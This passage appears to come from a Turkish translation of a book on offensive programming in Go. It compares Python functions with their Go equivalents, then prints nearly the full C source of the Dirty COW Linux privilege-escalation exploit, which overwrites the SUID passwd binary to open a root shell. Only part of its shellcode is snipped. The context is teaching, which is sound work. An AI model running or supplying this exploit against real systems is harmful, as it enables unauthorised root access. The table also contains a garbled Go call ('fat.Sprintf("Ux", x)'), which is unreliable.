Python                           Go                            Notlar
hex(x)                           fat.Sprintf("Ux", x)          Bir tamsayıyı (`x`), başında `"0x"` olacak
                                                               şekilde küçük harfli onaltılık (hex) 
                                                               bir stringe dönüştürür.
ord(c)                          rune(c)                        Tek bir karakterin tamsayı (`int32`)
                                                               değerini elde etmek için kullanılır.
                                                               Standart 8 bitlik string'ler veya çok
                                                               baytlı Unicode için çalışır. `rune`'un
                                                               Go'da yerleşik bir tür olduğunu ve ASCII
                                                               ile Unicode verileriyle çalışmayı oldukça
                                                               kolaylaştırdığını unutmayın.
chr(i) and unichr(i)            fmt.Sprintf("%+q", rune(i))    Python'daki `ord` fonksiyonunun tersi.
                                                               `chr` ve `unichr`, tamsayı girdisi için
                                                               uzunluğu 1 olan bir string döndürür.
                                                               Go'da `rune` türünü kullanırsınız ve
                                                               `%+q` format dizisini kullanarak bunu
                                                               string olarak elde edebilirsiniz.
struct.pack(fmt, v1, v2, . . .) binary.Write(. . .)            Verinin tür ve endianlık için uygun
                                                               şekilde biçimlendirilmiş ikili (binary)
                                                               gösterimini oluşturur.
struct.unpack(fmt, string)      binary.Read(. . .)             `struct.pack` ve `binary.Write`'in
                                                               tersidir. Yapılandırılmış ikili veriyi
                                                               belirtilen format ve türe okuyup çözer.

## Bir İstismarı C'den Taşımak

Şimdi Python'dan uzaklaşıp C'ye odaklanalım. C, tartışmalı olarak Python’dan daha az okunabilir bir dil olsa da, Python’un olduğundan daha fazla Go ile benzerlikler paylaşır. Bu da istismarları C’den Go’ya taşımayı düşündüğünüzden daha kolay hale getirir. Bunu göstermek için, Linux için yerel ayrıcalık yükseltme (local privilege escalation) istismarını Go’ya taşıyacağız.

Bu güvenlik açığı, Dirty COW olarak adlandırılmıştır ve Linux çekirdeğinin bellek alt sistemi içindeki bir yarış durumuna (race condition) ilişkindir. Bu hata, duyurulduğu zamanda, çoğu (hatta muhtemelen tüm) yaygın Linux ve Android dağıtımlarını etkiliyordu. Güvenlik açığı daha sonra yamandığı için, takip eden örnekleri yeniden üretebilmek adına bazı özel önlemler almanız gerekecek. Özellikle, savunmasız çekirdek sürümüne sahip bir Linux sistemi yapılandırmanız gerekir. Bunu kurmak bu bölümün kapsamı dışındadır; referans olması açısından, 3.13.1 çekirdek sürümüne sahip 64 bit Ubuntu 14.04 LTS dağıtımı kullanıyoruz.

İstismarın çeşitli varyasyonları kamuya açıktır. Bizim yeniden üretmeyi planladığımız sürümü `https://www.exploit-db.com/exploits/40616/` adresinde bulabilirsiniz. Liste 9-5, okunabilirliği artırmak için hafifçe değiştirilmiş orijinal istismar kodunun tamamını göstermektedir.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  --snip--
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n");
}

void *waitForWrite(void *arg) {
    char buf[sc_len];

    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s is overwritten\n", suid_binary);
            break;
        }
        fclose(fp);
        sleep(1);
    }

    stop = 1;

    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");

    system(suid_binary);
}

int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s.. to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, madviseThread, suid_binary);
    pthread_create(&pth2, NULL, procselfmemThread, payload);
    pthread_create(&pth3, NULL, waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0;
}
```

**Liste 9-5:** C dilinde yazılmış Dirty COW ayrıcalık yükseltme istismarı
